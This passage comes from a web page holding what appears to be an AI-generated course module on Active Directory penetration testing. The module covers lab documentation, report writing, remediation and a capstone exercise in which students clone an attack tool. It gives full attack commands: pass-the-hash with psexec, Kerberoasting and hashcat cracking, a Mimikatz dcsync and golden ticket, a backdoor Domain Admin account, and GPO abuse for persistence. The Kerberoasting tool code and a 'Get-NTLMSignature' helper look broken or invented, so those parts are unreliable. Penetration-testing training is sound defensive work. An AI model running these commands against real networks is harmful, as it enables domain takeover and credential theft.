**Command (from attacker machine):**\r\n        ```\r\n        python3 psexec.py contoso.local/administrator@DC01.contoso.local -hashes :$(Get-NTLMSignature -username svc_backup -password Password123) \"whoami\"\r\n        ```\r\n\r\n        **Output:**\r\n        ```\r\n        nt authority\\system\r\n        ```\r\n        ```\r\n\r\n*   **Phase 5: Domain Compromise**\r\n\r\n    *   **Objective:**  Gain control of the entire Active Directory domain. This is where you use the techniques from Module 5.\r\n    *   **Techniques Used:**  Describe the techniques you used to achieve domain compromise (e.g., Kerberoasting, AS-REP Roasting, Golden Ticket).\r\n    *   **Domain Administrator Access:**  Confirm that you have successfully obtained domain administrator privileges.\r\n    *   **Example:**\r\n\r\n        ```\r\n        **Technique:** Kerberoasting\r\n\r\n        **Tool:** GetUserSPNs.py (Impacket)\r\n\r\n        **Command (from attacker machine):**\r\n        ```\r\n        ```\r\n        python3 GetUserSPNs.py contoso.local/administrator@DC01.contoso.local -dc-ip 10.10.10.10 -request\r\n        ```\r\n        ```\r\n\r\n        **Output:**  (Captured Kerberos tickets for various service accounts)\r\n\r\n        **Tool:** Hashcat\r\n\r\n        **Command:** `hashcat -m 13100 kerberos_tickets.txt /usr/share/wordlists/rockyou.txt`\r\n\r\n        **Findings:**  Successfully cracked the password for the `svc_sql` service account.\r\n\r\n        **Technique:** Golden Ticket Attack\r\n\r\n        **Tool:** Mimikatz\r\n\r\n        **Command (on compromised system with domain admin privileges):**\r\n        ```powershell\r\n        mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:contoso.local /user:krbtgt\" \"kerberos::golden /domain:contoso.local /sid:S-1-5-21-1234567890-123456789-123456789-500 /user:administrator /krbtgt:$(Get-NTLMSignature -username krbtgt -password <krbtgt password>) /id:500 /ptt\"\r\n        ```\r\n\r\n        **Findings:**  Successfully created a Golden Ticket and injected it into the current session, granting persistent domain administrator access.  Verified with `whoami /groups` showing the `Domain Admins` group.\r\n        ```\r\n\r\n*   **Phase 6: Post-Exploitation**\r\n\r\n    *   **Objective:**  Maintain access and establish persistence within the compromised environment. This is where you use the techniques from Module 7.\r\n    *   **Techniques Used:**  Describe the techniques you used to maintain access (e.g., creating backdoor accounts, modifying GPOs, installing persistent backdoors).\r\n    *   **Persistence Mechanisms:**  Document the persistence mechanisms you implemented.\r\n    *   **Example:**\r\n\r\n        ```\r\n        **Technique:** Creating a backdoor user account\r\n\r\n        **Command (PowerShell on DC01):**\r\n        ```powershell\r\n        New-ADUser -Name \"backdoor_user\" -SamAccountName \"backdoor_user\" -UserPrincipalName \"backdoor_user@contoso.local\" -AccountPassword (ConvertTo-SecureString \"P@sswOrd123!\" -AsPlainText -Force) -Enabled $true -Path \"OU=Users,DC=contoso,DC=local\"\r\n        Add-ADGroupMember -Identity \"Domain Admins\" -Members \"backdoor_user\"\r\n        ```\r\n\r\n        **Findings:**  Created a hidden user account (\"backdoor_user\") with domain administrator privileges.\r\n\r\n        **Technique:** Modifying GPOs to execute malicious code\r\n\r\n        **GPO Modification:** Edited the \"Default Domain Policy\" GPO to execute a PowerShell script that adds a local administrator account on all domain-joined machines.\r\n\r\n        **Findings:**  Successfully added a local administrator account on all domain-joined machines.\r\n        ```\r\n\r\n*   **Phase 7: Reporting**\r\n    *   This phase is detailed in the next section.\r\n\r\n**Important Considerations:**\r\n\r\n*   **Screenshots:**  Include screenshots of key steps and findings.  This makes your documentation much more compelling and easier to understand.\r\n*   **Code Snippets:**  Include code snippets of the commands you ran, the scripts you wrote, and the configuration changes you made.\r\n*   **Timestamps:**  Record the date and time of each step.  This can be helpful for troubleshooting and analysis.\r\n\r\n---\r\n\r\n**Subtopic 3: Report Writing**\r\n\r\n*   **Structure of a Penetration Testing Report:**\r\n\r\n    1.  **Executive Summary:**\r\n        *   A brief overview of the entire penetration test (1-2 pages).\r\n        *   Summarize the key findings and their potential impact.\r\n        *   Highlight the most critical vulnerabilities and recommendations.\r\n        *   Written for a non-technical audience (management).\r\n    2.  **Introduction:**\r\n        *   Background information about the penetration test.\r\n        *   Objective and scope.\r\n        *   Rules of engagement.\r\n        *   Methodology used.\r\n    3.  **Findings and Recommendations:**\r\n        *   A detailed description of each vulnerability discovered.\r\n        *   Technical explanation of how the vulnerability was exploited.\r\n        *   Evidence (screenshots, code snippets, etc.).\r\n        *   Impact assessment (severity, likelihood, potential consequences).\r\n        *   Remediation recommendations (specific, actionable steps).\r\n        *   Prioritize findings based on risk (Critical, High, Medium, Low).\r\n    4.  **Technical Details:**\r\n        *   Detailed technical information that may not be appropriate for the main body of the report.\r\n        *   Raw output from tools, detailed configuration settings, etc.\r\n    5.  **Conclusion:**\r\n        *   A summary of the overall security posture of the organization.\r\n        *   Recommendations for improving security.\r\n        *   Next steps.\r\n    6.  **Appendix:**\r\n        *   Supporting documentation (e.g., network diagrams, policies, procedures).\r\n\r\n*   **Example Report Snippets:**\r\n\r\n    *   **Executive Summary:**\r\n\r\n        ```\r\n        This report summarizes the results of a penetration test conducted on the `contoso.local` Active Directory domain between October 26th and October 28th, 2023.  The penetration test revealed several critical vulnerabilities that could allow an attacker to gain complete control of the domain.  The most significant findings include the use of weak passwords, unpatched systems, and misconfigured Kerberos settings.  We strongly recommend that the organization implement the remediation steps outlined in this report to mitigate these risks.  Failure to do so could result in significant data loss, disruption of business operations, and reputational damage.\r\n        ```\r\n\r\n    *   **Finding and Recommendation (High Severity):**\r\n\r\n        ```\r\n        **Vulnerability:** Kerberoasting\r\n\r\n        **Description:**  Several service accounts in the `contoso.local` domain have weak passwords that can be cracked using Kerberoasting.  An attacker can request Kerberos tickets for these service accounts and then crack the tickets offline to obtain the passwords.\r\n\r\n        **Technical Details:**  The attacker used the `GetUserSPNs.py` tool to request Kerberos tickets for the following service accounts: `svc_sql`, `svc_exchange`, and `svc_backup`.  The tickets were then cracked using Hashcat with a dictionary attack.  The password for the `svc_sql` account was cracked in approximately 2 hours.\r\n\r\n        **Impact:**  An attacker who obtains the password for a service account can use that account to access sensitive data or perform privileged actions.  In this case, the `svc_sql` account has access to the company's financial database.\r\n\r\n        **Recommendation:**\r\n        1.  Enforce strong password policies for all service accounts.  Passwords should be at least 15 characters long and should contain a mix of uppercase letters, lowercase letters, numbers, and symbols.\r\n        2.  Regularly rotate the passwords for all service accounts.\r\n        3.  Monitor service account activity for suspicious behavior.\r\n        ```\r\n\r\n*   **Key Considerations:**\r\n\r\n    *   **Audience:**  Tailor your report to the audience.  The executive summary should be written for management, while the findings and recommendations should be written for technical staff.\r\n    *   **Objectivity:**  Present your findings in an objective and unbiased manner.  Avoid making subjective judgments or assumptions.\r\n    *   **Professionalism:**  Use professional language and formatting.  Proofread your report carefully for errors.\r\n    *   **Confidentiality:**  Treat the report as confidential information.  Restrict access to authorized personnel only.\r\n\r\n---\r\n\r\n**Subtopic 4: Remediation Strategies**\r\n\r\n*   **General Principles:**\r\n\r\n    *   **Prioritize:** Focus on the most critical vulnerabilities first.\r\n    *   **Layered Defense:** Implement multiple layers of security to protect against attacks.\r\n    *   **Automation:** Automate security tasks whenever possible.\r\n    *   **Monitoring:** Continuously monitor your systems for suspicious activity.\r\n    *   **Education:** Educate your users about security best practices.\r\n\r\n*   **Specific Remediation Recommendations (Examples):**\r\n\r\n    *   **Weak Passwords:**\r\n        *   Enforce strong password policies.\r\n        *   Implement multi-factor authentication.\r\n        *   Monitor for password spraying attacks.\r\n        *   Use password complexity requirements.\r\n    *   **Unpatched Systems:**\r\n        *   Implement a patch management system.\r\n        *   Regularly scan for vulnerabilities.\r\n        *   Isolate vulnerable systems.\r\n    *   **Misconfigured Kerberos Settings:**\r\n        *   Disable unconstrained delegation.\r\n        *   Monitor for Kerberoasting attacks.\r\n        *   Use Kerberos armoring.\r\n        *   Implement Protected Users Group\r\n    *   **Lack of Least Privilege:**\r\n        *   Review and reduce user privileges.\r\n        *   Implement role-based access control (RBAC).\r\n        *   Use Privileged Access Management (PAM) solutions.\r\n    *   **Missing Security Controls:**\r\n        *   Implement intrusion detection and prevention systems (IDS/IPS).\r\n        *   Deploy endpoint detection and response (EDR) solutions.\r\n        *   Use security information and event management (SIEM) systems.\r\n    *   **Backdoors:**\r\n        *   Regularly audit user accounts and group memberships.\r\n        *   Monitor for suspicious activity on domain controllers.\r\n        *   Implement code integrity checks.\r\n        *   Harden domain controllers according to best practices.\r\n\r\n---\r\n\r\n**Subtopic 5: Capstone Project: Attack Tool Cloning**\r\n\r\nThis is where you bring everything together and demonstrate your mastery of the material.\r\n\r\n*   **Choosing a Tool/Technique:**\r\n\r\n    *   Select one of the key attack tools/techniques covered in the course.  Good choices include:\r\n        *   Kerberoasting\r\n        *   AS-REP Roasting\r\n        *   Password Spraying\r\n        *   Pass-the-Hash/Pass-the-Ticket\r\n\r\n*   **Planning Your Clone:**\r\n\r\n    1.  **Functionality:**  What are the core features of the tool/technique you're cloning?  What command-line options will you support?\r\n    2.  **Language:**  Choose a programming language (Python or PowerShell are recommended).\r\n    3.  **Libraries:**  Identify any libraries you'll need (e.g., `Impacket`, `ldap3`, `requests`).\r\n    4.  **Architecture:**  Design the overall structure of your tool.  How will the different components interact?\r\n    5.  **Error Handling:**  How will your tool handle errors?  How will it provide feedback to the user?\r\n    6.  **Logging:**  How will your tool log its activity?  This is important for debugging and analysis.\r\n\r\n*   **Example: Cloning Kerberoasting (Python)**\r\n\r\n    *   **Core Functionality:**\r\n        *   Enumerate Service Principal Names (SPNs).\r\n        *   Request Kerberos tickets for those SPNs.\r\n        *   Save the tickets to a file.\r\n\r\n    *   **Command-Line Options:**\r\n        *   `-d, --domain`:  The Active Directory domain to target.\r\n        *   `-u, --username`:  The username to use for authentication.\r\n        *   `-p, --password`:  The password to use for authentication.\r\n        *   `-dc, --dc-ip`:  The IP address of a domain controller.\r\n        *   `-o, --output-file`: The file to save the kerberos tickets to.\r\n\r\n    *   **Libraries:**\r\n        *   `Impacket` (for Kerberos authentication and SPN enumeration)\r\n        *   `argparse` (for command-line argument parsing)\r\n\r\n    *   **Code (Simplified Example):**\r\n\r\n        ```python\r\n        #!/usr/bin/env python3\r\n        import argparse\r\n        from impacket.examples import GetUserSPNs\r\n        from impacket.krb5.kerberosv5 import getKerberosTGT\r\n        from impacket.krb5 import constants\r\n        from impacket.dcerpc.v5 import transport\r\n\r\n        def main():\r\n            parser = argparse.ArgumentParser(description=\"Kerberoasting tool clone\")\r\n            parser.add_argument(\"-d\", \"--domain\", required=True, help=\"The Active Directory domain to target\")\r\n            parser.add_argument(\"-u\", \"--username\", required=True, help=\"The username to use for authentication\")\r\n            parser.add_argument(\"-p\", \"--password\", required=True, help=\"The password to use for authentication\")\r\n            parser.add_argument(\"-dc\", \"--dc-ip\", required=True, help=\"The IP address of a domain controller\")\r\n            parser.add_argument(\"-o\", \"--output-file\", required=True, help=\"The file to save the kerberos tickets to\")\r\n            args = parser.parse_args()\r\n\r\n            try:\r\n                # Authenticate to the domain\r\n                print(\"[*] Authenticating to the domain...\")\r\n                username = args.username\r\n                password = args.password\r\n                domain = args.domain\r\n                dc_ip = args.dc_ip\r\n\r\n                # Perform Kerberos authentication to get a TGT\r\n                # Copied from GetUserSPNs.py example from Impacket\r\n                stringBinding = r'ncacn_np:{}[\\pipe\\lsarpc]'.format(dc_ip)\r\n                rpctransport = transport.DCERPCTransportFactory(stringBinding)\r\n\r\n                if hasattr(rpctransport, 'set_credentials'):\r\n                    rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash='', nthash='')\r\n\r\n                dce = rpctransport.get_dce_rpc()\r\n                dce.connect()\r\n                dce.bind(GetUserSPNs.MSRPC_UUID_LSARPC)\r\n\r\n                get_user_spns = GetUserSPNs.GetUserSPNs(username, password, domain, dc_ip, dce)\r\n\r\n                # Enumerate SPNs\r\n                print(\"[*] Enumerating SPNs...\")\r\n                spns = get_user_spns.dump()\r\n\r\n                # Save the Kerberos tickets to a file\r\n                print(f\"[*] Saving Kerberos tickets to {args.output_file}...\")\r\n                with open(args.output_file, \"w\") as f:\r\n                    for spn in spns:\r\n                        f.write(spn + \"\\n\")\r\n\r\n                print(\"[+] Done!\")\r\n\r\n            except Exception as e:\r\n                print(f\"[-] Error: {e}\")\r\n\r\n        if __name__ == \"__main__\":\r\n            main()\r\n        ```\r\n\r\n    *   **Explanation:**\r\n        1.  **Import Libraries:** Imports the necessary libraries.\r\n        2.  **Parse Arguments:**  Parses the command-line arguments.\r\n        3.  **Authenticate:** Use `Impacket` to authenticate to the domain and obtain a Kerberos Ticket Granting Ticket (TGT).\r\n        4.  **Enumerate SPNs:** Use `Impacket` to enumerate the Service Principal Names (SPNs) in the domain.\r\n        5.  **Request Tickets:** Request Kerberos tickets for each SPN.\r\n        6.  **Save Tickets:** Save the Kerberos tickets to a file in a format suitable for cracking with Hashcat or John the Ripper.\r\n        7.  **Error Handling:** Includes basic error handling.\r\n\r\n*   **Testing:**\r\n\r\n    *   Test your tool thoroughly in your lab environment.\r\n    *   Verify that it correctly implements the core functionality.\r\n    *   Test all command-line options.\r\n    *   Check for errors and handle them gracefully.\r\n\r\n*   **Documentation:**\r\n\r\n    *   Document the design, implementation, and testing of your tool.\r\n    *   Explain how the tool works.\r\n    *   Describe the command-line options.\r\n    *   Provide examples of how to use the tool.\r\n\r\n*   **Presentation:**\r\n\r\n    *   Prepare a presentation to demonstrate your tool to the class (if applicable) or to a designated reviewer.\r\n    *   Explain the purpose of the tool.\r\n    *   Show how it works.\r\n    *   Demonstrate its functionality in your lab environment.\r\n\r\n---\r\n\r\n**Module Project:**\r\n\r\n1.  **Complete Documentation:**  Document all steps taken during the penetration test of your lab environment, from initial enumeration to domain compromise. Include detailed descriptions of the vulnerabilities exploited and the impact of each attack.  Provide actionable recommendations for remediation.\r\n2.  **Capstone Project:**  Develop your chosen attack tool clone.  Document the design, implementation, and testing of your tool.  Demonstrate its functionality in your lab environment.  Present your documentation and tool to the class (if applicable) or to a designated reviewer.\r\n\r\n---\r\n\r\n**Grading Rubric (Example):**\r\n\r\n*   **Documentation (50%):**\r\n    *   Completeness:  Covers all phases of the penetration test (10%)\r\n    *   Accuracy:  Provides accurate and verifiable information (10%)\r\n    *   Clarity:  Uses clear and concise language (10%)\r\n    *   Organization:  Logically structured and easy to follow (10%)\r\n    *   Actionable Recommendations:  Provides specific and practical remediation steps (10%)\r\n*   **Capstone Project (50%):**\r\n    *   Functionality:  Implements the core functionality of the chosen attack (20%)\r\n    *   Code Quality:  Well-written, readable, and maintainable code (10%)\r\n    *   Documentation:  Provides clear and comprehensive documentation (10%)\r\n    *   Presentation:  Clearly explains the purpose and functionality of the tool (10%)\r\n\r\n---\r\n\r\nThis is a comprehensive outline and guide for Module 8. Remember, the key is to *do* the work. Build your lab, run the commands, write the code, and document your findings. Good luck!  Let me know if you have any questions as you work through this."
    }
  ]
}
        </script>
    
    </div>
    <script src="../script.js"></script> <!-- Include script based on flag -->
</body>
</html>
